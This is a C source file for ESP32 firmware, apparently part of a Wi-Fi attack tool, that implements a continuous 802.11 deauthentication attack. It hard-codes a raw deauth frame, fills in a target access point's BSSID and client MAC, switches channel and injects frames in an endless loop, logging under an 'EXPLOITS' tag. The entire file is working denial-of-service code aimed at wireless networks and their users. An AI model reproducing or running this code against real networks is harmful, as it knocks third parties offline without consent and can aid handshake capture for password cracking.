/**
 * @file deauther.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implements functionality for transmitting deauthentication packets
 */

#include "deauther.h"

#include <stdio.h>
#include <string.h>

#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "injector.h"

static TaskHandle_t deauther_task_handle = NULL;

/**
 * Subtype (1 byte)
 * Flags (1 byte)
 * Duration (2 bytes)
 * Receiver address (6 bytes)
 * Source address (6 bytes)
 * BSSID (6 bytes)
 * Sequence number (2 bytes)
 * Reason code (2 bytes)
 */
static uint8_t deauth_payload[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff,
                                   0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0xf0, 0xff, 0x02, 0x00};

// void output_payload() {
//   printf("{DEAUTH,PAYLOAD,");
//   for (uint8_t i = 0; i < 26; i++) {
//     printf("%02X", deauth_payload[i]);
//   }
//   printf(",}\n");
// }

void run_deauth() {
  printf("{EXPLOITS,DEAUTH_STARTING,}\n");

  while (1) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    for (uint8_t i = 0; i < 50; i++) {
      vTaskDelay(50 / portTICK_PERIOD_MS);
      inject_frame(deauth_payload, 26);
    }
  }
}

void deauther_stop_task() {
  if (deauther_task_handle != NULL) {
    vTaskDelete(deauther_task_handle);
    deauther_task_handle = NULL;
    uint8_t broadcast_address[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    memcpy(&deauth_payload[4], broadcast_address, 6);
  }
}

void deauther_set_client_target(uint8_t client_target_mac[6]) {
  printf("{EXPLOITS,DEAUTH_CLIENT_TARGET,%02X:%02X:%02X:%02X:%02X:%02X,}\n",
         client_target_mac[0], client_target_mac[1], client_target_mac[2],
         client_target_mac[3], client_target_mac[4], client_target_mac[5]);
  memcpy(&deauth_payload[4], client_target_mac, 6);
}

void deauther_start_task(uint8_t channel, uint8_t target_ap_bssid[6]) {
  printf("{EXPLOITS,DEAUTH_TARGET,%02X:%02X:%02X:%02X:%02X:%02X,%u,}\n",
         target_ap_bssid[0], target_ap_bssid[1], target_ap_bssid[2],
         target_ap_bssid[3], target_ap_bssid[4], target_ap_bssid[5], channel);
  // TODO: Crash Deauth
  ESP_ERROR_CHECK(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));
  memcpy(&deauth_payload[10], target_ap_bssid, 6);
  memcpy(&deauth_payload[16], target_ap_bssid, 6);
  xTaskCreatePinnedToCore((TaskFunction_t)run_deauth, TASK_DEAUTHER_NAME,
                          TASK_DEAUTHER_STACK_SIZE, NULL,
                          TASK_DEAUTHER_PRIORITY, &deauther_task_handle,
                          TASK_DEAUTHER_CORE_TO_USE);
}